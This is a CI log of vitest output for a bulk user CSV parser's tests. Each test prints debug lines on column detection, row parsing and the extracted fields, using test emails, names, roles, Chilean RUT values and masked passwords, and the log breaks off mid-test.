2025-11-18T17:35:43.4988029Z [90mstdout[2m | __tests__/utils/bulkUserParser.test.ts[2m > [22m[2mBulk User Parser Utilities[2m > [22m[2mparseBulkUserData[2m > [22m[2mshould parse basic CSV with headers[22m[39m
2025-11-18T17:35:43.4989244Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:43.4990167Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:43.4991375Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:43.4992046Z }
2025-11-18T17:35:43.4993323Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:43.4994464Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.4994906Z   totalCells: [33m4[39m,
2025-11-18T17:35:43.4995806Z   cellValues: [ [32m'john@test.com'[39m, [32m'John'[39m, [32m'Doe'[39m, [32m'admin'[39m ],
2025-11-18T17:35:43.5011324Z   columnMapping: {
2025-11-18T17:35:43.5011808Z     email: [33m0[39m,
2025-11-18T17:35:43.5012191Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5012584Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5012944Z     role: [33m3[39m,
2025-11-18T17:35:43.5013276Z     rut: [33m-1[39m,
2025-11-18T17:35:43.5013626Z     password: [33m-1[39m
2025-11-18T17:35:43.5013939Z   }
2025-11-18T17:35:43.5014173Z }
2025-11-18T17:35:43.5014500Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5014972Z   email: [32m'john@test.com'[39m,
2025-11-18T17:35:43.5015427Z   firstName: [32m'John'[39m,
2025-11-18T17:35:43.5015819Z   lastName: [32m'Doe'[39m,
2025-11-18T17:35:43.5016198Z   role: [32m'admin'[39m,
2025-11-18T17:35:43.5016604Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5017125Z }
2025-11-18T17:35:43.5017431Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5017962Z   totalCells: [33m4[39m,
2025-11-18T17:35:43.5018767Z   cellValues: [ [32m'jane@test.com'[39m, [32m'Jane'[39m, [32m'Smith'[39m, [32m'docente'[39m ],
2025-11-18T17:35:43.5019382Z   columnMapping: {
2025-11-18T17:35:43.5019736Z     email: [33m0[39m,
2025-11-18T17:35:43.5020289Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5020733Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5021093Z     role: [33m3[39m,
2025-11-18T17:35:43.5021429Z     rut: [33m-1[39m,
2025-11-18T17:35:43.5021775Z     password: [33m-1[39m
2025-11-18T17:35:43.5022067Z   }
2025-11-18T17:35:43.5022298Z }
2025-11-18T17:35:43.5022625Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5023084Z   email: [32m'jane@test.com'[39m,
2025-11-18T17:35:43.5023539Z   firstName: [32m'Jane'[39m,
2025-11-18T17:35:43.5023968Z   lastName: [32m'Smith'[39m,
2025-11-18T17:35:43.5024368Z   role: [32m'docente'[39m,
2025-11-18T17:35:43.5024833Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5025181Z }
2025-11-18T17:35:43.5025340Z 
2025-11-18T17:35:43.5026725Z [90mstdout[2m | __tests__/utils/bulkUserParser.test.ts[2m > [22m[2mBulk User Parser Utilities[2m > [22m[2mparseBulkUserData[2m > [22m[2mshould parse CSV without headers[22m[39m
2025-11-18T17:35:43.5028574Z [CSV-PARSER] Column detection: { originalHeaders: [], normalizedHeaders: [] }
2025-11-18T17:35:43.5029297Z [CSV-PARSER] Column indices: {
2025-11-18T17:35:43.5029762Z   email: [33m-1[39m,
2025-11-18T17:35:43.5030169Z   firstName: [33m-1[39m,
2025-11-18T17:35:43.5030618Z   lastName: [33m-1[39m,
2025-11-18T17:35:43.5031059Z   role: [33m-1[39m,
2025-11-18T17:35:43.5031438Z   rut: [33m-1[39m,
2025-11-18T17:35:43.5031829Z   password: [33m-1[39m
2025-11-18T17:35:43.5032185Z }
2025-11-18T17:35:43.5032356Z 
2025-11-18T17:35:43.5033780Z [90mstdout[2m | __tests__/utils/bulkUserParser.test.ts[2m > [22m[2mBulk User Parser Utilities[2m > [22m[2mparseBulkUserData[2m > [22m[2mshould handle quoted values[22m[39m
2025-11-18T17:35:43.5034980Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:43.5036002Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:43.5037651Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:43.5038411Z }
2025-11-18T17:35:43.5039799Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:43.5040818Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5041281Z   totalCells: [33m4[39m,
2025-11-18T17:35:43.5042218Z   cellValues: [ [32m'john@test.com'[39m, [32m'John "JD" Doe'[39m, [32m'Smith, Jr.'[39m, [32m'admin'[39m ],
2025-11-18T17:35:43.5042963Z   columnMapping: {
2025-11-18T17:35:43.5043356Z     email: [33m0[39m,
2025-11-18T17:35:43.5044000Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5044421Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5044828Z     role: [33m3[39m,
2025-11-18T17:35:43.5045216Z     rut: [33m-1[39m,
2025-11-18T17:35:43.5045613Z     password: [33m-1[39m
2025-11-18T17:35:43.5045934Z   }
2025-11-18T17:35:43.5046190Z }
2025-11-18T17:35:43.5046559Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5047312Z   email: [32m'john@test.com'[39m,
2025-11-18T17:35:43.5047840Z   firstName: [32m'John "JD" Doe'[39m,
2025-11-18T17:35:43.5048380Z   lastName: [32m'Smith, Jr.'[39m,
2025-11-18T17:35:43.5048837Z   role: [32m'admin'[39m,
2025-11-18T17:35:43.5049301Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5049658Z }
2025-11-18T17:35:43.5049812Z 
2025-11-18T17:35:43.5051206Z [90mstdout[2m | __tests__/utils/bulkUserParser.test.ts[2m > [22m[2mBulk User Parser Utilities[2m > [22m[2mparseBulkUserData[2m > [22m[2mshould validate emails[22m[39m
2025-11-18T17:35:43.5052401Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:43.5053327Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:43.5054514Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:43.5055191Z }
2025-11-18T17:35:43.5056648Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:43.5057893Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5058335Z   totalCells: [33m4[39m,
2025-11-18T17:35:43.5059162Z   cellValues: [ [32m'invalid-email'[39m, [32m'John'[39m, [32m'Doe'[39m, [32m'admin'[39m ],
2025-11-18T17:35:43.5059825Z   columnMapping: {
2025-11-18T17:35:43.5060206Z     email: [33m0[39m,
2025-11-18T17:35:43.5060588Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5060999Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5061389Z     role: [33m3[39m,
2025-11-18T17:35:43.5061772Z     rut: [33m-1[39m,
2025-11-18T17:35:43.5062155Z     password: [33m-1[39m
2025-11-18T17:35:43.5062488Z   }
2025-11-18T17:35:43.5062738Z }
2025-11-18T17:35:43.5063107Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5063631Z   email: [32m'invalid-email'[39m,
2025-11-18T17:35:43.5064160Z   firstName: [32m'John'[39m,
2025-11-18T17:35:43.5064610Z   lastName: [32m'Doe'[39m,
2025-11-18T17:35:43.5065035Z   role: [32m'admin'[39m,
2025-11-18T17:35:43.5065501Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5065860Z }
2025-11-18T17:35:43.5066183Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5066620Z   totalCells: [33m4[39m,
2025-11-18T17:35:43.5067654Z   cellValues: [ [32m'valid@email.com'[39m, [32m'Jane'[39m, [32m'Smith'[39m, [32m'docente'[39m ],
2025-11-18T17:35:43.5068335Z   columnMapping: {
2025-11-18T17:35:43.5068722Z     email: [33m0[39m,
2025-11-18T17:35:43.5069117Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5069534Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5069943Z     role: [33m3[39m,
2025-11-18T17:35:43.5070320Z     rut: [33m-1[39m,
2025-11-18T17:35:43.5070721Z     password: [33m-1[39m
2025-11-18T17:35:43.5071064Z   }
2025-11-18T17:35:43.5071314Z }
2025-11-18T17:35:43.5071681Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5072217Z   email: [32m'valid@email.com'[39m,
2025-11-18T17:35:43.5072745Z   firstName: [32m'Jane'[39m,
2025-11-18T17:35:43.5073222Z   lastName: [32m'Smith'[39m,
2025-11-18T17:35:43.5073665Z   role: [32m'docente'[39m,
2025-11-18T17:35:43.5074147Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5074509Z }
2025-11-18T17:35:43.5074658Z 
2025-11-18T17:35:43.5076020Z [90mstdout[2m | __tests__/utils/bulkUserParser.test.ts[2m > [22m[2mBulk User Parser Utilities[2m > [22m[2mparseBulkUserData[2m > [22m[2mshould validate roles[22m[39m
2025-11-18T17:35:43.5077476Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:43.5078416Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:43.5079872Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:43.5080567Z }
2025-11-18T17:35:43.5081903Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:43.5082888Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5083348Z   totalCells: [33m4[39m,
2025-11-18T17:35:43.5084225Z   cellValues: [ [32m'john@test.com'[39m, [32m'John'[39m, [32m'Doe'[39m, [32m'invalid_role'[39m ],
2025-11-18T17:35:43.5084907Z   columnMapping: {
2025-11-18T17:35:43.5085289Z     email: [33m0[39m,
2025-11-18T17:35:43.5085686Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5086104Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5086511Z     role: [33m3[39m,
2025-11-18T17:35:43.5087064Z     rut: [33m-1[39m,
2025-11-18T17:35:43.5087464Z     password: [33m-1[39m
2025-11-18T17:35:43.5087806Z   }
2025-11-18T17:35:43.5088073Z }
2025-11-18T17:35:43.5088431Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5088954Z   email: [32m'john@test.com'[39m,
2025-11-18T17:35:43.5089464Z   firstName: [32m'John'[39m,
2025-11-18T17:35:43.5089899Z   lastName: [32m'Doe'[39m,
2025-11-18T17:35:43.5090370Z   role: [32m'invalid_role'[39m,
2025-11-18T17:35:43.5090869Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5091227Z }
2025-11-18T17:35:43.5091702Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5092129Z   totalCells: [33m4[39m,
2025-11-18T17:35:43.5092927Z   cellValues: [ [32m'jane@test.com'[39m, [32m'Jane'[39m, [32m'Smith'[39m, [32m'admin'[39m ],
2025-11-18T17:35:43.5093558Z   columnMapping: {
2025-11-18T17:35:43.5093952Z     email: [33m0[39m,
2025-11-18T17:35:43.5094336Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5094732Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5095114Z     role: [33m3[39m,
2025-11-18T17:35:43.5095476Z     rut: [33m-1[39m,
2025-11-18T17:35:43.5095849Z     password: [33m-1[39m
2025-11-18T17:35:43.5096180Z   }
2025-11-18T17:35:43.5096425Z }
2025-11-18T17:35:43.5096954Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5097593Z   email: [32m'jane@test.com'[39m,
2025-11-18T17:35:43.5098084Z   firstName: [32m'Jane'[39m,
2025-11-18T17:35:43.5098544Z   lastName: [32m'Smith'[39m,
2025-11-18T17:35:43.5098960Z   role: [32m'admin'[39m,
2025-11-18T17:35:43.5099428Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5099780Z }
2025-11-18T17:35:43.5099923Z 
2025-11-18T17:35:43.5101386Z [90mstdout[2m | __tests__/utils/bulkUserParser.test.ts[2m > [22m[2mBulk User Parser Utilities[2m > [22m[2mparseBulkUserData[2m > [22m[2mshould validate RUT when enabled[22m[39m
2025-11-18T17:35:43.5102624Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:43.5103675Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m, [32m'rut'[39m ],
2025-11-18T17:35:43.5105077Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m, [32m'rut'[39m ]
2025-11-18T17:35:43.5105839Z }
2025-11-18T17:35:43.5107315Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m4[39m, password: [33m-1[39m }
2025-11-18T17:35:43.5108276Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5108721Z   totalCells: [33m5[39m,
2025-11-18T17:35:43.5109656Z   cellValues: [ [32m'john@test.cl'[39m, [32m'John'[39m, [32m'Doe'[39m, [32m'admin'[39m, [32m'12345678-5'[39m ],
2025-11-18T17:35:43.5110394Z   columnMapping: {
2025-11-18T17:35:43.5110811Z     email: [33m0[39m,
2025-11-18T17:35:43.5111212Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5111669Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5112093Z     role: [33m3[39m,
2025-11-18T17:35:43.5112484Z     rut: [33m4[39m,
2025-11-18T17:35:43.5112891Z     password: [33m-1[39m
2025-11-18T17:35:43.5113235Z   }
2025-11-18T17:35:43.5113483Z }
2025-11-18T17:35:43.5113850Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5114587Z   email: [32m'john@test.cl'[39m,
2025-11-18T17:35:43.5115086Z   firstName: [32m'John'[39m,
2025-11-18T17:35:43.5115519Z   lastName: [32m'Doe'[39m,
2025-11-18T17:35:43.5115943Z   role: [32m'admin'[39m,
2025-11-18T17:35:43.5116423Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5116972Z }
2025-11-18T17:35:43.5117432Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5117938Z   totalCells: [33m5[39m,
2025-11-18T17:35:43.5118935Z   cellValues: [ [32m'jane@test.cl'[39m, [32m'Jane'[39m, [32m'Smith'[39m, [32m'docente'[39m, [32m'invalid-rut'[39m ],
2025-11-18T17:35:43.5119704Z   columnMapping: {
2025-11-18T17:35:43.5120124Z     email: [33m0[39m,
2025-11-18T17:35:43.5120546Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5121097Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5121548Z     role: [33m3[39m,
2025-11-18T17:35:43.5121936Z     rut: [33m4[39m,
2025-11-18T17:35:43.5122324Z     password: [33m-1[39m
2025-11-18T17:35:43.5122682Z   }
2025-11-18T17:35:43.5122937Z }
2025-11-18T17:35:43.5123308Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5123834Z   email: [32m'jane@test.cl'[39m,
2025-11-18T17:35:43.5124397Z   firstName: [32m'Jane'[39m,
2025-11-18T17:35:43.5124935Z   lastName: [32m'Smith'[39m,
2025-11-18T17:35:43.5125414Z   role: [32m'docente'[39m,
2025-11-18T17:35:43.5125921Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5126290Z }
2025-11-18T17:35:43.5126664Z 
2025-11-18T17:35:43.5128451Z [90mstdout[2m | __tests__/utils/bulkUserParser.test.ts[2m > [22m[2mBulk User Parser Utilities[2m > [22m[2mparseBulkUserData[2m > [22m[2mshould skip RUT validation when disabled[22m[39m
2025-11-18T17:35:43.5129751Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:43.5130797Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m, [32m'rut'[39m ],
2025-11-18T17:35:43.5132211Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m, [32m'rut'[39m ]
2025-11-18T17:35:43.5132985Z }
2025-11-18T17:35:43.5134389Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m4[39m, password: [33m-1[39m }
2025-11-18T17:35:43.5135389Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5135912Z   totalCells: [33m5[39m,
2025-11-18T17:35:43.5137260Z   cellValues: [ [32m'john@test.cl'[39m, [32m'John'[39m, [32m'Doe'[39m, [32m'admin'[39m, [32m'invalid-rut'[39m ],
2025-11-18T17:35:43.5138059Z   columnMapping: {
2025-11-18T17:35:43.5138505Z     email: [33m0[39m,
2025-11-18T17:35:43.5138932Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5139381Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5139803Z     role: [33m3[39m,
2025-11-18T17:35:43.5140189Z     rut: [33m4[39m,
2025-11-18T17:35:43.5140599Z     password: [33m-1[39m
2025-11-18T17:35:43.5140942Z   }
2025-11-18T17:35:43.5141194Z }
2025-11-18T17:35:43.5141574Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5142132Z   email: [32m'john@test.cl'[39m,
2025-11-18T17:35:43.5142652Z   firstName: [32m'John'[39m,
2025-11-18T17:35:43.5143097Z   lastName: [32m'Doe'[39m,
2025-11-18T17:35:43.5143552Z   role: [32m'admin'[39m,
2025-11-18T17:35:43.5144035Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5144404Z }
2025-11-18T17:35:43.5144551Z 
2025-11-18T17:35:43.5146128Z [90mstdout[2m | __tests__/utils/bulkUserParser.test.ts[2m > [22m[2mBulk User Parser Utilities[2m > [22m[2mparseBulkUserData[2m > [22m[2mshould generate passwords when not provided[22m[39m
2025-11-18T17:35:43.5147657Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:43.5148687Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:43.5149986Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:43.5150693Z }
2025-11-18T17:35:43.5152022Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:43.5153241Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5153730Z   totalCells: [33m4[39m,
2025-11-18T17:35:43.5154575Z   cellValues: [ [32m'john@test.com'[39m, [32m'John'[39m, [32m'Doe'[39m, [32m'admin'[39m ],
2025-11-18T17:35:43.5155233Z   columnMapping: {
2025-11-18T17:35:43.5155636Z     email: [33m0[39m,
2025-11-18T17:35:43.5156051Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5156489Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5157222Z     role: [33m3[39m,
2025-11-18T17:35:43.5157639Z     rut: [33m-1[39m,
2025-11-18T17:35:43.5158067Z     password: [33m-1[39m
2025-11-18T17:35:43.5158462Z   }
2025-11-18T17:35:43.5158726Z }
2025-11-18T17:35:43.5159125Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5159739Z   email: [32m'john@test.com'[39m,
2025-11-18T17:35:43.5160298Z   firstName: [32m'John'[39m,
2025-11-18T17:35:43.5160929Z   lastName: [32m'Doe'[39m,
2025-11-18T17:35:43.5161387Z   role: [32m'admin'[39m,
2025-11-18T17:35:43.5161882Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5162267Z }
2025-11-18T17:35:43.5162432Z 
2025-11-18T17:35:43.5164034Z [90mstdout[2m | __tests__/utils/bulkUserParser.test.ts[2m > [22m[2mBulk User Parser Utilities[2m > [22m[2mparseBulkUserData[2m > [22m[2mshould not generate passwords when disabled[22m[39m
2025-11-18T17:35:43.5165583Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:43.5166608Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:43.5168118Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:43.5168826Z }
2025-11-18T17:35:43.5170151Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:43.5171135Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5171589Z   totalCells: [33m4[39m,
2025-11-18T17:35:43.5172421Z   cellValues: [ [32m'john@test.com'[39m, [32m'John'[39m, [32m'Doe'[39m, [32m'admin'[39m ],
2025-11-18T17:35:43.5173081Z   columnMapping: {
2025-11-18T17:35:43.5173478Z     email: [33m0[39m,
2025-11-18T17:35:43.5173900Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5174347Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5174781Z     role: [33m3[39m,
2025-11-18T17:35:43.5175186Z     rut: [33m-1[39m,
2025-11-18T17:35:43.5175602Z     password: [33m-1[39m
2025-11-18T17:35:43.5175938Z   }
2025-11-18T17:35:43.5176202Z }
2025-11-18T17:35:43.5176585Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5177492Z   email: [32m'john@test.com'[39m,
2025-11-18T17:35:43.5178068Z   firstName: [32m'John'[39m,
2025-11-18T17:35:43.5178564Z   lastName: [32m'Doe'[39m,
2025-11-18T17:35:43.5179031Z   role: [32m'admin'[39m,
2025-11-18T17:35:43.5179539Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5179938Z }
2025-11-18T17:35:43.5180111Z 
2025-11-18T17:35:43.5181640Z [90mstdout[2m | __tests__/utils/bulkUserParser.test.ts[2m > [22m[2mBulk User Parser Utilities[2m > [22m[2mparseBulkUserData[2m > [22m[2mshould use provided passwords[22m[39m
2025-11-18T17:35:43.5182970Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:43.5184238Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m, [32m'rut'[39m, [32m'password'[39m ],
2025-11-18T17:35:43.5185918Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m, [32m'rut'[39m, [32m'password'[39m ]
2025-11-18T17:35:43.5186999Z }
2025-11-18T17:35:43.5188400Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m4[39m, password: [33m5[39m }
2025-11-18T17:35:43.5189392Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5189856Z   totalCells: [33m6[39m,
2025-11-18T17:35:43.5190910Z   cellValues: [ [32m'john@test.com'[39m, [32m'John'[39m, [32m'Doe'[39m, [32m'admin'[39m, [32m''[39m, [32m'MyPassword123'[39m ],
2025-11-18T17:35:43.5192748Z   columnMapping: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m4[39m, password: [33m5[39m }
2025-11-18T17:35:43.5193595Z }
2025-11-18T17:35:43.5193970Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5194529Z   email: [32m'john@test.com'[39m,
2025-11-18T17:35:43.5195048Z   firstName: [32m'John'[39m,
2025-11-18T17:35:43.5195542Z   lastName: [32m'Doe'[39m,
2025-11-18T17:35:43.5195993Z   role: [32m'admin'[39m,
2025-11-18T17:35:43.5196504Z   password: [32m'***PRESENT***'[39m
2025-11-18T17:35:43.5197225Z }
2025-11-18T17:35:43.5197388Z 
2025-11-18T17:35:43.5198868Z [90mstdout[2m | __tests__/utils/bulkUserParser.test.ts[2m > [22m[2mBulk User Parser Utilities[2m > [22m[2mparseBulkUserData[2m > [22m[2mshould handle empty lines[22m[39m
2025-11-18T17:35:43.5200162Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:43.5201156Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:43.5202475Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:43.5203210Z }
2025-11-18T17:35:43.5204806Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:43.5205823Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5206323Z   totalCells: [33m4[39m,
2025-11-18T17:35:43.5207393Z   cellValues: [ [32m'john@test.com'[39m, [32m'John'[39m, [32m'Doe'[39m, [32m'admin'[39m ],
2025-11-18T17:35:43.5208091Z   columnMapping: {
2025-11-18T17:35:43.5208535Z     email: [33m0[39m,
2025-11-18T17:35:43.5208957Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5209392Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5209835Z     role: [33m3[39m,
2025-11-18T17:35:43.5210263Z     rut: [33m-1[39m,
2025-11-18T17:35:43.5210707Z     password: [33m-1[39m
2025-11-18T17:35:43.5211083Z   }
2025-11-18T17:35:43.5211358Z }
2025-11-18T17:35:43.5211743Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5212326Z   email: [32m'john@test.com'[39m,
2025-11-18T17:35:43.5212866Z   firstName: [32m'John'[39m,
2025-11-18T17:35:43.5213329Z   lastName: [32m'Doe'[39m,
2025-11-18T17:35:43.5213777Z   role: [32m'admin'[39m,
2025-11-18T17:35:43.5214272Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5214662Z }
2025-11-18T17:35:43.5215021Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5215513Z   totalCells: [33m4[39m,
2025-11-18T17:35:43.5216389Z   cellValues: [ [32m'jane@test.com'[39m, [32m'Jane'[39m, [32m'Smith'[39m, [32m'docente'[39m ],
2025-11-18T17:35:43.5217284Z   columnMapping: {
2025-11-18T17:35:43.5217709Z     email: [33m0[39m,
2025-11-18T17:35:43.5218151Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5218621Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5219070Z     role: [33m3[39m,
2025-11-18T17:35:43.5219489Z     rut: [33m-1[39m,
2025-11-18T17:35:43.5219917Z     password: [33m-1[39m
2025-11-18T17:35:43.5220276Z   }
2025-11-18T17:35:43.5220544Z }
2025-11-18T17:35:43.5220993Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5221559Z   email: [32m'jane@test.com'[39m,
2025-11-18T17:35:43.5222127Z   firstName: [32m'Jane'[39m,
2025-11-18T17:35:43.5222706Z   lastName: [32m'Smith'[39m,
2025-11-18T17:35:43.5223191Z   role: [32m'docente'[39m,
2025-11-18T17:35:43.5223693Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5224067Z }
2025-11-18T17:35:43.5224216Z 
2025-11-18T17:35:43.5225870Z [90mstdout[2m | __tests__/utils/bulkUserParser.test.ts[2m > [22m[2mBulk User Parser Utilities[2m > [22m[2mparseBulkUserData[2m > [22m[2mshould add warnings for Chilean emails without RUT[22m[39m
2025-11-18T17:35:43.5227431Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:43.5228462Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:43.5230056Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:43.5230797Z }
2025-11-18T17:35:43.5232177Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:43.5233170Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5233653Z   totalCells: [33m4[39m,
2025-11-18T17:35:43.5234502Z   cellValues: [ [32m'john@empresa.cl'[39m, [32m'John'[39m, [32m'Doe'[39m, [32m'admin'[39m ],
2025-11-18T17:35:43.5235175Z   columnMapping: {
2025-11-18T17:35:43.5235558Z     email: [33m0[39m,
2025-11-18T17:35:43.5235962Z     firstName: [33m1[39m,
